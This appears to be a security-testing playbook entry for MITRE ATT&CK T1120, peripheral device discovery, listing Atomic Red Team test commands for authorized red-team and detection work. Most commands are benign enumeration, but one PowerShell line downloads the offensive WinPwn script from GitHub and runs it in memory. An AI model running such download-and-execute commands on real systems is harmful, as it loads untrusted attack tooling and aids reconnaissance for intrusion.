---
name: "T1120_peripheral-device-discovery"
description: "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system."
category: "information-gathering"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1120
  - discovery
  - linux
  - windows
  - macos
technique_id: "T1120"
tactic: "discovery"
all_tactics:
  - discovery
platforms:
  - Linux
  - Windows
  - macOS
mitre_url: "https://attack.mitre.org/techniques/T1120"
tech_stack:
  - linux
  - windows
  - macos
cwe_ids:
  - CWE-200
chains_with:
  []
prerequisites:
  []
severity_boost: {}
---

# T1120 Peripheral Device Discovery

## High-Level Description

Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.

## Kill Chain Phase

- Discovery (TA0007)

**Platforms:** Linux, Windows, macOS

## What to Check

- [ ] Identify if Peripheral Device Discovery technique is applicable to target environment
- [ ] Check Linux systems for indicators of Peripheral Device Discovery
- [ ] Check Windows systems for indicators of Peripheral Device Discovery
- [ ] Check macOS systems for indicators of Peripheral Device Discovery
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Win32_PnPEntity Hardware Inventory

Perform peripheral device discovery using Get-WMIObject Win32_PnPEntity

**Supported Platforms:** windows

```powershell
Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\T1120_collection.txt
$Space,$Heading,$Break,$Data = Get-Content $env:TEMP\T1120_collection.txt
@($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne "" } |Set-Content $env:TEMP\T1120_collection.txt
```

### Atomic Test 2: WinPwn - printercheck

Search for printers / potential vulns using printercheck function of WinPwn

**Supported Platforms:** windows

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
printercheck -noninteractive -consoleoutput
```

### Atomic Test 3: Peripheral Device Discovery via fsutil

Performs pheripheral device discovery utilizing fsutil to list all drives.

**Supported Platforms:** windows

```cmd
fsutil fsinfo drives
```

### Atomic Test 4: Get Printer Device List via PowerShell Command

This test uses PowerShell to list printers on a Windows system, demonstrating a discovery technique attackers might use to 
gather details on connected devices. Using Get-Printer, they can view information on all available printers, identifying 
potential devices for further targeting.

**Supported Platforms:** windows

```powershell
Get-Printer
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Peripheral Device Discovery by examining the target platforms (Linux, Windows, macOS).

2. **Assess Existing Defenses**: Review whether mitigations for T1120 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

No specific mitigations documented for this technique.

## Detection

### Peripheral Device Enumeration via System Utilities and API Calls


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Peripheral Device Discovery technique applicable | Medium | Discovery |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-200 | Exposure of Sensitive Information |


## References

- [Peripheral Discovery Linux](https://linuxhint.com/list-usb-devices-linux/)
- [Peripheral Discovery macOS](https://ss64.com/osx/system_profiler.html)
- [Atomic Red Team - T1120](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1120)
- [MITRE ATT&CK - T1120](https://attack.mitre.org/techniques/T1120)
